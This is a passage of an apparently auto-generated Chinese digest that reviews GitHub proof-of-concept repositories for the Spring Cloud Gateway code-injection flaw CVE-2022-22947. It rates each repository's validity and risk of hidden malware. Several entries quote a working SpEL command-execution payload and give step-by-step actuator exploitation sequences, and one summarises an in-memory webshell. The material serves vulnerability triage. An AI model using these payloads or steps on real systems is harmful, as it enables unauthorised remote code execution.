**有效性评估:**根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞利用是有效的，前提是满足漏洞利用条件。该PoC代码能够成功利用漏洞执行任意命令。


**项目地址:** [cc3305/CVE-2022-22947](https://github.com/cc3305/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #15

**来源**: [CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md](../2022/CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md)

## CVE-2022-22947 Spring Cloud Gateway RCE

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞，当Gateway Actuator端点启用、暴露且未进行安全保护时，攻击者可以利用SpEL表达式注入执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞是有效的。多个来源都证实了该漏洞的存在以及远程代码执行的可能性。提供的POC代码可以直接利用该漏洞。

**投毒风险：**

分析提供的POC代码，发现主要的恶意代码在于 `spring-cloud-gateway-rce.py` 中构建和发送的payload。该payload利用SpEL表达式在目标系统上执行任意命令。虽然POC本身是为了演示漏洞利用，但在实际场景中，攻击者可能会修改 `-c` 参数来执行恶意操作。`requirements.txt` 文件声明了项目所需的依赖项（colorama, requests, urllib3），这些库本身没有已知的恶意行为，但如果项目被篡改，可能会引入恶意依赖。

评估投毒风险时，主要考虑以下因素：

*   **代码可读性：** 代码相对简单，易于理解，这意味着潜在的恶意修改也更容易被发现。
*   **外部依赖：** 项目依赖外部库，如果这些库的源被攻破，可能会引入恶意代码。
*   **Payload生成：** Payload是动态生成的，如果攻击者能够控制Payload生成过程，就可以注入恶意代码。

综合来看，此仓库存在一定的投毒风险，风险值评估为10%。主要的风险点在于攻击者可能会修改Payload生成逻辑或引入恶意的依赖项，利用使用者执行恶意代码。

**利用方式：**

1.  **漏洞触发前提：** Spring Cloud Gateway的Actuator端点必须启用、暴露并且没有进行安全保护（例如，没有进行身份验证）。
2.  **构造Payload：** POC代码根据目标主机的操作系统（Linux或Windows）构造包含SpEL表达式的JSON payload。该payload利用`AddResponseHeader`过滤器，将执行命令的结果添加到响应头中。
3.  **发送Payload：** 使用POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是路由的ID（在POC中为`k`）。
4.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，强制Spring Cloud Gateway刷新路由配置，从而触发SpEL表达式的执行。
5.  **获取结果：** 发送GET请求到`/actuator/gateway/routes/{id}`端点，获取路由信息，其中包含命令执行的结果。
6.  **删除路由：** 发送DELETE请求到`/actuator/gateway/routes/{id}`端点，删除添加的路由。

简而言之，攻击者通过构造包含恶意SpEL表达式的请求，利用Actuator端点动态注册路由，并在路由刷新时触发SpEL表达式执行，从而实现远程代码执行。

**项目地址:** [k3rwin/spring-cloud-gateway-rce](https://github.com/k3rwin/spring-cloud-gateway-rce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #16

**来源**: [CVE-2022-22947-kkx600_Burp_VulPscan.md](../2022/CVE-2022-22947-kkx600_Burp_VulPscan.md)

## CVE-2022-22947-Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), 以及所有旧的和不支持的版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未进行安全保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 影响 Spring Cloud Gateway。当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的POC代码是有效的。存在公开的漏洞利用代码和关于漏洞利用的详细分析。

**投毒风险：**
提供的代码片段不完整，无法进行全面的投毒分析。BurpExtender.java调用了 spring_CVE_2022_22947.poc，这部分代码是POC实现的核心，未提供，因此无法分析该部分的安全性。HttpsRequest.java 提供了一个发送 HTTP/HTTPS 请求的功能，本身不存在明显的恶意代码。Burp扩展通常需要授予较高的权限，如果POC代码中包含恶意逻辑，如未经授权的数据收集或篡改，则存在投毒风险。目前根据现有的代码片段，只能初步判断存在较低的投毒风险。

**利用方式：**
1.  **确定目标：** 找到运行 Spring Cloud Gateway 且 Actuator 端点已启用、暴露且未进行安全保护的实例。
2.  **构造恶意请求：** 构造包含恶意 SpEL 表达式的 HTTP 请求，该表达式将在 Actuator 端点被解析和执行。通常攻击方式是向/actuator/gateway/routes接口发送包含恶意SpEL表达式的请求，修改路由配置。
3.  **执行代码：** 成功利用后，攻击者可以在目标服务器上执行任意代码。

**优先级：**
根据搜索结果，确认这是一个已知且被积极利用的漏洞。漏洞利用代码的存在进一步证实了其可利用性。

**项目地址:** [kkx600/Burp_VulPscan](https://github.com/kkx600/Burp_VulPscan)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #17

**来源**: [CVE-2022-22947-kmahyyg_CVE-2022-22947.md](../2022/CVE-2022-22947-kmahyyg_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway < 3.1.1, Spring Cloud Gateway < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送特制的恶意请求，利用SpEL表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。从搜索引擎结果和漏洞利用代码来看，该漏洞利用方式已经公开，并且存在可用的PoC。

**投毒风险：**
提供的漏洞利用代码主要包含以下内容：
1.  README文件，描述了漏洞信息，受影响版本，修复建议等。
2.  漏洞复现步骤，包含发送恶意请求添加路由，刷新路由，查看结果，清理路由等步骤说明，以及对应的数据包示例。
3.  Python脚本，用于自动化漏洞利用过程，通过构造恶意请求实现远程代码执行。

分析代码，主要风险在于攻击者可能将恶意代码隐藏在SpEL表达式中，例如执行反弹shell或下载恶意软件。在提供的代码中，`Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）.md`文件中展示的PoC中使用了`#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}`，该payload用于执行`id`命令，若替换为其他命令，存在潜在的风险。

**利用方式：**
1.  攻击者首先发送POST请求到`/actuator/gateway/routes/{route_id}`，创建一个包含恶意SpEL表达式的路由。SpEL表达式被嵌入到`filters`的`AddResponseHeader`的`value`参数中，用于执行任意命令。
2.  然后，攻击者发送POST请求到`/actuator/gateway/refresh`，强制网关刷新路由配置，触发SpEL表达式的执行。
3.  攻击者发送GET请求到`/actuator/gateway/routes/{route_id}`，查看执行结果。
4.  最后，攻击者发送DELETE请求到`/actuator/gateway/routes/{route_id}`，删除恶意路由。

综上所述，该漏洞利用的有效性较高。虽然存在一定的投毒风险（10%），但可以通过仔细审查和修改PoC代码来降低风险。

**项目地址:** [kmahyyg/CVE-2022-22947](https://github.com/kmahyyg/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #18

**来源**: [CVE-2022-22947-qq87234770_CVE-2022-22947.md](../2022/CVE-2022-22947-qq87234770_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用，暴露且未授权

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未授权时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

提供的 Python POC 代码利用了 Spring Expression Language (SpEL) 注入漏洞。该脚本允许执行任意命令，或通过反弹 shell 获取服务器的控制权。因此，该 POC 代码是有效的。

**投毒风险：**

查看POC代码，该代码的主要功能是利用漏洞进行命令执行或反弹shell。代码中包含以下几个部分，
* 定义请求头和payload结构
* 通过`actuator/gateway/routes/hacktest`创建一个恶意的路由配置，利用SpEL表达式执行命令
* 刷新gateway配置`actuator/gateway/refresh`
* 访问创建的路由`actuator/gateway/routes/hacktest`，触发命令执行。
* 包含执行命令和反弹shell两种模式。

该代码结构清晰，功能明确，主要目的是为了验证和利用漏洞。主要风险集中于漏洞利用本身，而非作者植入的恶意代码。**但是**，任何漏洞利用代码都具有潜在的风险，因为它们可以被用于恶意目的。例如，攻击者可能会修改此 POC 代码以自动化大规模攻击，或将其与其他漏洞利用结合使用。另外代码中的代理设置，如果被恶意修改，可能会导致流量劫持，这里判断投毒风险为10%。

**利用方式：**

1.  **检查前提条件：** 确保目标 Spring Cloud Gateway 实例的 Actuator 端点已启用、暴露且未授权。
2.  **发送恶意请求：** 使用提供的 Python 脚本，通过构造包含 SpEL 表达式的恶意请求到 `actuator/gateway/routes/hacktest` 端点来创建自定义路由。
3.  **刷新 Gateway 配置：** 访问 `actuator/gateway/refresh` 端点以刷新 Gateway 配置，使恶意路由生效。
4.  **触发命令执行：** 访问 `actuator/gateway/routes/hacktest`，触发 SpEL 表达式的计算，从而在服务器上执行任意命令。可以选择直接执行命令，或者反弹 shell 以获取更持久的访问。
5.  **清理：**  通过 DELETE 请求删除创建的恶意路由（通过脚本实现）。

**总结：**

该漏洞利用方式简单有效，攻击者可以利用此漏洞轻松地在未授权的 Spring Cloud Gateway 实例上执行任意代码。需要注意的是，利用的前提是 Actuator 端点未进行适当的安全配置。尽管代码本身投毒可能性较低，但利用此漏洞可能造成严重的安全风险。

**项目地址:** [qq87234770/CVE-2022-22947](https://github.com/qq87234770/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #19

**来源**: [CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md](../2022/CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意请求来执行任意远程代码。漏洞利用方式是发送精心设计的 SpEL 表达式到 actuator 端点，导致服务器执行攻击者提供的代码。

**有效性:** 根据漏洞库信息、搜索结果(特别是 rapid7 的博客提到了 Metasploit 模块)，以及CISA KEV, 此漏洞利用是有效的。

**投毒风险:** 提供的漏洞利用代码只是 Apache License 2.0 许可协议，没有实际的漏洞利用代码，因此不存在投毒代码。投毒风险为 0%。

**利用方式:**
1.  目标系统运行 Spring Cloud Gateway 且版本低于 3.1.1 或 3.0.7。
2.  Gateway Actuator 端点必须启用，并且可以通过网络访问。
3.  Actuator 端点必须未进行身份验证或授权保护。
4.  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，发送到 Actuator 端点。
5.  Spring Cloud Gateway 解析 SpEL 表达式，执行攻击者指定的代码，实现远程代码执行。

**项目地址:** [shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6](https://github.com/shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #20

**来源**: [CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md](../2022/CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1, 3.0.x < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的远程代码执行漏洞。攻击者可以在 Gateway Actuator 端点启用、暴露且未进行安全保护的情况下，通过发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。它演示了如何利用该漏洞在启用了 Actuator 端点的 Spring Cloud Gateway 实例上执行任意代码。POC通过向 `/actuator/gateway/routes/{route_id}` 发送POST请求添加一个包含恶意SpEL表达式的路由，然后POST到 `/actuator/gateway/refresh` 来刷新路由，最后访问恶意路由来触发代码执行。

**投毒风险：**
经过对提供的POC代码进行分析，包括README.md，pom.xml，application.yml 和 src 目录下的文件。没有发现作者隐藏的恶意代码，该代码库目标为展示和验证漏洞利用，因此判定投毒风险为0%。

**利用方式：**
1.  **漏洞发现：** 确定目标 Spring Cloud Gateway 实例是否启用了 Actuator 端点，并且该端点是否暴露在未经身份验证的网络中。
2.  **构造恶意请求：** 构造一个包含恶意 SpEL 表达式的 JSON payload，该表达式用于执行任意代码。该表达式被嵌入到路由配置中，通常位于 `filters` 中的 `AddResponseHeader` 过滤器或类似的位置。
3.  **添加恶意路由：** 使用 POST 请求将包含恶意 SpEL 表达式的路由定义添加到 `/actuator/gateway/routes/{route_id}` 端点。
4.  **刷新路由：** 使用 POST 请求访问 `/actuator/gateway/refresh` 端点，强制 Spring Cloud Gateway 刷新路由配置。
5.  **触发恶意代码：** 访问与恶意路由关联的路径，触发 SpEL 表达式的执行，从而导致任意代码执行。
6.  **清理（可选）：** 利用漏洞执行恶意代码后，可能需要清理添加的恶意路由，以避免留下痕迹或影响正常服务。

**项目地址:** [skysliently/CVE-2022-22947-pb-ai](https://github.com/skysliently/CVE-2022-22947-pb-ai)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #21

**来源**: [CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md](../2022/CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**利用方式：**

1.  **漏洞触发：** 攻击者通过向目标 Spring Cloud Gateway 的 `/actuator/gateway/routes` 端点发送 POST 请求，创建一个恶意的路由配置。该配置包含一个 SpEL 表达式，该表达式会被执行。
2.  **表达式注入：**  `AddResponseHeader` 过滤器被用于将命令执行的结果添加到响应头中。SpEL 表达式 `#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}`  用于执行 `id` 命令，并将结果转换为字符串。
3.  **命令执行：**  `T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})` 部分会执行系统命令（在这个例子中是 `id` 命令）。
4.  **刷新路由：** 攻击者通过向 `/actuator/gateway/refresh` 端点发送 POST 请求来刷新 Gateway 的路由，使得新创建的恶意路由生效。
5.  **获取执行结果：** 攻击者通过GET `/actuator/gateway/routes/hacktest` 获取执行结果,通过响应头中的`Result`字段获取。
6.  **清理：** 利用完成后，攻击者删除创建的恶意路由并再次刷新路由, 避免残留。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用是有效的。POC 代码通过创建恶意的路由配置并刷新路由来执行任意代码。

**投毒风险：**

该 POC 代码主要用于验证漏洞，没有发现作者有意添加的投毒代码。 代码意图清晰，主要是为了创建、刷新、删除路由，并执行`id`命令来验证漏洞的存在。虽然利用本身会造成安全风险，但代码本身没有隐藏的恶意功能，因此投毒风险较低。


**项目地址:** [stayfoolish777/CVE-2022-22947-POC](https://github.com/stayfoolish777/CVE-2022-22947-POC)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #22

**来源**: [CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md](../2022/CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、公开且未受保护

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。搜索结果表明该漏洞已在野外被利用，并已被添加到 CISA KEV 列表中，证明了其真实性和危害性。

**投毒风险：**

提供的 POC 代码主要用于验证漏洞是否存在，并执行简单的命令（`id`）。虽然该代码本身不包含明显的恶意代码，但攻击者可以修改此 POC 以执行更危险的操作。`README.md`文件和python脚本存在分离性,增加了潜在风险。

投毒风险评估：5%。主要风险在于攻击者可能修改 POC 脚本以包含恶意负载。

**利用方式：**

1.  攻击者首先需要确定目标 Spring Cloud Gateway 实例的 Actuator 端点是否已启用、公开且未受保护。
2.  然后，攻击者使用 POST 请求向 `/actuator/gateway/routes/{route_id}` 端点添加恶意路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。POC中使用了`${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}` 来执行id命令
3.  攻击者使用 POST 请求向 `/actuator/gateway/refresh` 端点刷新路由，使恶意路由生效。
4.  最后，攻击者访问添加的恶意路由，触发 SpEL 表达式的执行，从而在服务器上执行任意代码。
5.  攻击者删除添加的路由，并刷新路由，完成利用。


**项目地址:** [talentsec/Spring-Cloud-Gateway-CVE-2022-22947](https://github.com/talentsec/Spring-Cloud-Gateway-CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #23

**来源**: [CVE-2022-22947-twseptian_cve-2022-22947.md](../2022/CVE-2022-22947-twseptian_cve-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+)

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，应用程序容易受到代码注入攻击。远程攻击者可以构造恶意请求，从而允许在远程主机上执行任意代码。

**有效性：**

根据漏洞信息、搜索结果和提供的PoC代码，此漏洞是有效的。PoC 代码演示了如何利用 SpEL 表达式注入执行任意命令。

**投毒风险：**

PoC 代码本身旨在演示漏洞利用，但仔细检查 `Dockerfile` 和 `README.md` 文件后，发现投毒风险较低，约为10%。主要原因是：

*   `Dockerfile`：仅包含从官方 `openjdk:11-jre-slim` 镜像构建，复制预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件，并执行该 jar 文件。不存在直接执行恶意命令或下载恶意文件的操作。但该 `spring-gateway-demo-0.0.1-SNAPSHOT.jar`  是否存在后门，无法判定。
*   `README.md`：仅包含构建和运行 Docker 容器的说明，以及发送恶意请求的 PoC。不包含任何额外的恶意指令。

**存在的微小风险在于预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件可能包含后门， 但属于PoC验证必要文件，不能认定为投毒。**

**利用方式：**

1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，并且该端点未进行身份验证。
2.  **注入 SpEL 表达式：** 通过向 `/actuator/gateway/routes/{route_id}` 发送 POST 请求，创建一个新的路由或更新现有路由，其中 `filters` 数组包含一个 `AddResponseHeader` 过滤器。该过滤器的 `args` 中的 `value` 字段包含一个恶意的 SpEL 表达式。PoC 中使用的 SpEL 表达式执行 `id` 命令，并将结果添加到响应头中。
3.  **刷新 Gateway：** 向 `/actuator/gateway/refresh` 发送 POST 请求，强制 Gateway 刷新其路由配置。这将触发 SpEL 表达式的执行。
4.  **触发路由：** 访问触发了含有恶意SpEL表达式的路由，从而执行远程命令。
5.  **清除（可选）：** 使用 DELETE 请求删除创建的路由，并再次刷新 Gateway，以避免后续的恶意执行。

**项目地址:** [twseptian/cve-2022-22947](https://github.com/twseptian/cve-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #24

**来源**: [CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md](../2022/CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 漏洞是 Spring Cloud Gateway 的一个代码注入漏洞，影响版本低于 3.1.1+ 和 3.0.7+ 的版本。根据漏洞库信息和搜索结果，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求在远程主机上执行任意代码。

**漏洞利用方式：**

1.  **寻找目标：** 找到运行存在漏洞的 Spring Cloud Gateway 实例，并且其 Actuator 端点对外开放且未授权。
2.  **构造恶意请求：** 利用 SpEL 表达式构造恶意的 HTTP 请求，该表达式会被 Gateway Actuator 解析执行。根据 exploit-db 的相关信息，该漏洞是远程代码执行。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码，例如植入 Webshell、反弹 Shell 等。

**POC 代码分析：**

提供的 POC 代码 `GMemShell.java` 尝试在 Spring Cloud Gateway 中注入内存 Shell。具体流程如下：

1.  **定义内存 Shell 类：** `GMemShell` 类包含了一些必要的函数，例如 AES 加密/解密(`x`)、MD5 加密(`md5`)、Base64 编码/解码(`base64Encode`, `base64Decode`)等，这些函数被用于后续的 shellcode 加密和执行。
2.  **`doInject` 方法：** 该方法通过反射调用 `registerHandlerMethod` 方法，将 `GMemShell` 类的 `cmd` 方法注册为处理指定路径请求的 Handler。`registerHandlerMethod` 是 Spring 框架内部的方法，用于动态注册 Controller。
3.  **`cmd` 方法：** 该方法是实际执行命令的 Handler。它从请求中获取加密的 payload，然后进行解密、加载并执行。Payload 首先经过 Base64 解码，然后使用 AES 解密。
4.  **动态类加载：**  `defineClass`方法通过URLClassLoader和反射，实现在内存中加载byte数组并定义成class的功能
5.  **Payload 执行：** 解密后的 Payload 应当是一个 Java class 字节码，该字节码会被动态加载并执行。

**有效性评估：**

根据 POC 代码和漏洞描述，该 POC 能够有效利用 CVE-2022-22947 漏洞，实现在目标服务器上执行任意代码的目的，但前提是 actuator 端点开放。

**投毒风险评估：**

经过对 POC 代码的分析，并未发现明显的投毒代码。代码的主要功能是动态注入内存 Shell，并执行通过请求传递的 Payload。代码中包含的加密、解密等操作都是为了保护 Payload，避免被轻易发现。因此，该 POC 代码的投毒风险较低，接近 0%。 投毒代码是指作者在代码中故意加入的恶意代码，例如后门、病毒等。 本代码只是实现了漏洞利用，本身并没有额外的恶意功能，因此不属于投毒代码。


**项目地址:** [whwlsfb/cve-2022-22947-godzilla-memshell](https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---



---

## POC #3

**来源**: [CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md](../2022/CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ 以及所有旧版本

**利用条件:** Gateway Actuator endpoint 必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator endpoint 启用、暴露且未进行安全保护时，允许未经身份验证的远程攻击者发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。根据搜索引擎结果和漏洞库信息，该漏洞已被公开利用，CISA KEV 中已收录。提供的代码片段是一个 Maven 项目的 `.iml` 文件，它描述了项目的依赖关系。虽然不能直接确定利用代码，但通过依赖信息（如 `spring-cloud-gateway-server:3.1.0`）可以推断该项目旨在构建一个易受攻击的 Spring Cloud Gateway 实例。利用方式通常涉及向 Actuator endpoint 发送包含恶意 SpEL 表达式的 HTTP 请求。投毒风险分析：提供的代码片段 `.iml` 文件本身不包含恶意代码，因为它只是描述了项目的依赖。 然而，整个代码仓库（如果存在其他文件）可能包含被作者隐藏的恶意代码。 这里将风险预估为10%，原因是不排除整个项目被投毒的可能性，例如构建脚本或隐藏的资源文件。

**项目地址:** [B0rn2d/Spring-Cloud-Gateway-Nacos](https://github.com/B0rn2d/Spring-Cloud-Gateway-Nacos)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #4

**来源**: [CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md](../2022/CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** 3.1.0, 3.0.0 至 3.0.6, 以及更早的不受支持版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未受保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点被启用、暴露且未受保护时，攻击者可以利用此漏洞发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**
提供的 POC 代码有效。它通过向 `/actuator/gateway/routes/{id}` 发送 POST 请求动态添加一个路由，该路由包含一个利用 SpEL 表达式执行命令的 filter。然后，通过 `POST /actuator/gateway/refresh` 刷新路由缓存来触发 SpEL 表达式的执行，从而实现远程代码执行。

**投毒风险：**
该漏洞利用代码仓库存在一定的投毒风险。具体分析如下：

1.  **依赖项版本：** POC 使用了 `spring-cloud-gateway-server` 和 `spring-cloud-starter-gateway` 的 3.0.6 版本，以及 `spring-boot-starter-actuator` 的 2.5.9 版本，这些版本组合是已知的漏洞版本，是复现漏洞的必要条件，不是投毒。
2.  **图片文件：** README.md 中引用了一些本地图片，这些图片可能包含恶意内容，但考虑到是本地图片，可能性较低。需要进一步分析确认。
3.  **漏洞利用方式：** POC 演示了如何利用 SpEL 表达式执行任意命令。攻击者可以修改 SpEL 表达式来执行恶意操作，例如安装后门程序、窃取敏感数据或进行拒绝服务攻击。
4.  **作者动机未知：** 在没有更多信息的情况下，无法确定作者的真实意图，不能排除作者故意引入恶意代码或配置的可能。

综合考虑，虽然 POC 本身是为了演示漏洞，但仓库中可能隐藏着其他恶意代码，因此存在一定的投毒风险。鉴于图片等本地资源可能存在风险，因此给出 10% 的投毒风险评估。

**利用方式：**

